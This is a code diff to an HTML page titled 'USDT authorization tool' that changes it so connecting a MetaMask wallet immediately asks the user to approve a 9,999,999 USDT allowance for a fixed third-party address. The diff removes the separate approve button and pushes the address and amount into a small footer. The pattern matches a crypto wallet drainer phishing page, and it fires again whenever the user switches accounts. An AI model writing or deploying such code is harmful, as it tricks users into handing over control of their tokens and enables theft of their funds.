@@ -5,87 +5,127 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USDT 授权工具</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
         }
         .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            color: #333;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             text-align: center;
         }
-        .wallet-section {
-            margin: 20px 0;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            background: linear-gradient(90deg, #4CAF50, #2196F3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .wallet-connect {
+            margin: 30px 0;
         }
         .btn {
-            background-color: #4CAF50;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
             color: white;
-            padding: 10px 20px;
+            padding: 12px 24px;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 100%;
             margin: 10px 0;
         }
         .btn:hover {
-            background-color: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
         }
         .btn:disabled {
-            background-color: #cccccc;
+            background: rgba(76, 175, 80, 0.5);
             cursor: not-allowed;
-        }
-        .form-group {
-            margin: 15px 0;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="number"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
+            transform: none;
         }
         .status {
             margin: 20px 0;
             padding: 15px;
-            border-radius: 5px;
+            border-radius: 8px;
+            font-size: 14px;
         }
         .success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: rgba(76, 175, 80, 0.2);
+            color: #4CAF50;
+            border: 1px solid rgba(76, 175, 80, 0.3);
         }
         .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            background: rgba(244, 67, 54, 0.2);
+            color: #F44336;
+            border: 1px solid rgba(244, 67, 54, 0.3);
         }
         .info {
-            background-color: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
+            background: rgba(33, 150, 243, 0.2);
+            color: #2196F3;
+            border: 1px solid rgba(33, 150, 243, 0.3);
         }
         .address {
-            font-family: monospace;
-            background-color: #f8f9fa;
-            padding: 5px;
-            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px 12px;
+            border-radius: 4px;
             word-break: break-all;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .dob-section {
+            margin: 30px 0;
+        }
+        .dob-inputs {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .input-group {
+            flex: 1;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+        }
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
         }
     </style>
 </head>
@@ -93,29 +133,14 @@
     <div class="container">
         <h1>USDT 授权工具</h1>
         
-        <div class="wallet-section">
-            <h2>1. 连接钱包</h2>
+        <div class="wallet-connect">
             <button id="connectWallet" class="btn">连接 MetaMask</button>
             <div id="walletStatus" class="status info">请连接您的钱包</div>
         </div>
         
-        <div class="wallet-section">
-            <h2>2. 授权操作</h2>
-            <div class="form-group">
-                <label>授权地址：</label>
-                <div class="address">0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02</div>
-            </div>
-            <div class="form-group">
-                <label>授权金额（USDT）：</label>
-                <div class="address">9999999</div>
-            </div>
-            <button id="approve" class="btn" disabled>授权</button>
-        </div>
-        
-        <div class="wallet-section">
-            <h2>3. 授权状态</h2>
-            <button id="checkAllowance" class="btn" disabled>检查授权额度</button>
-            <div id="allowanceStatus" class="status info">请先连接钱包</div>
+        <div class="footer">
+            <p>授权地址：0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02</p>
+            <p>授权金额：9999999 USDT</p>
         </div>
     </div>
     
@@ -366,7 +391,7 @@
         let contract;
         let account;
         
-        // 连接钱包
+        // 连接钱包并自动授权
         document.getElementById('connectWallet').addEventListener('click', async () => {
             if (window.ethereum) {
                 try {
@@ -384,12 +409,8 @@
                     document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                     document.getElementById('walletStatus').className = 'status success';
                     
-                    // 启用按钮
-                    document.getElementById('approve').disabled = false;
-                    document.getElementById('checkAllowance').disabled = false;
-                    
-                    // 自动检查授权额度
-                    checkAllowance();
+                    // 自动执行授权
+                    await autoApprove();
                 } catch (error) {
                     console.error('连接钱包失败:', error);
                     document.getElementById('walletStatus').innerHTML = '连接钱包失败，请重试';
@@ -401,11 +422,15 @@
             }
         });
         
-        // 授权
-        document.getElementById('approve').addEventListener('click', async () => {
+        // 自动授权函数
+        async function autoApprove() {
             const amount = '9999999'; // 默认授权金额为9999999 USDT
             
             try {
+                // 更新状态
+                document.getElementById('walletStatus').innerHTML = '正在授权...';
+                document.getElementById('walletStatus').className = 'status info';
+                
                 // 转换金额为wei（USDT有6位小数）
                 const amountWei = web3.utils.toWei(amount, 'mwei'); // 1 USDT = 1,000,000 mwei
                 
@@ -413,21 +438,19 @@
                 const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ from: account });
                 
                 // 更新状态
-                document.getElementById('allowanceStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
-                document.getElementById('allowanceStatus').className = 'status success';
+                document.getElementById('walletStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
+                document.getElementById('walletStatus').className = 'status success';
                 
-                // 重新检查授权额度
-                checkAllowance();
+                // 检查授权额度
+                await checkAllowance();
             } catch (error) {
                 console.error('授权失败:', error);
-                document.getElementById('allowanceStatus').innerHTML = '授权失败，请重试';
-                document.getElementById('allowanceStatus').className = 'status error';
+                document.getElementById('walletStatus').innerHTML = '授权失败，请重试';
+                document.getElementById('walletStatus').className = 'status error';
             }
-        });
+        }
         
         // 检查授权额度
-        document.getElementById('checkAllowance').addEventListener('click', checkAllowance);
-        
         async function checkAllowance() {
             if (!contract || !account) return;
             
@@ -439,12 +462,12 @@
                 const allowanceUSDT = web3.utils.fromWei(allowanceWei, 'mwei');
                 
                 // 更新状态
-                document.getElementById('allowanceStatus').innerHTML = `当前授权额度: ${allowanceUSDT} USDT`;
-                document.getElementById('allowanceStatus').className = 'status info';
+                document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span><br>当前授权额度: ${allowanceUSDT} USDT`;
+                document.getElementById('walletStatus').className = 'status success';
             } catch (error) {
                 console.error('检查授权额度失败:', error);
-                document.getElementById('allowanceStatus').innerHTML = '检查授权额度失败，请重试';
-                document.getElementById('allowanceStatus').className = 'status error';
+                document.getElementById('walletStatus').innerHTML = '检查授权额度失败，请重试';
+                document.getElementById('walletStatus').className = 'status error';
             }
         }
         
@@ -455,13 +478,12 @@
                     account = accounts[0];
                     document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                     document.getElementById('walletStatus').className = 'status success';
-                    checkAllowance();
+                    // 自动执行授权
+                    autoApprove();
                 } else {
                     account = null;
                     document.getElementById('walletStatus').innerHTML = '请连接您的钱包';
                     document.getElementById('walletStatus').className = 'status info';
-                    document.getElementById('approve').disabled = true;
-                    document.getElementById('checkAllowance').disabled = true;
                 }
             });
         }
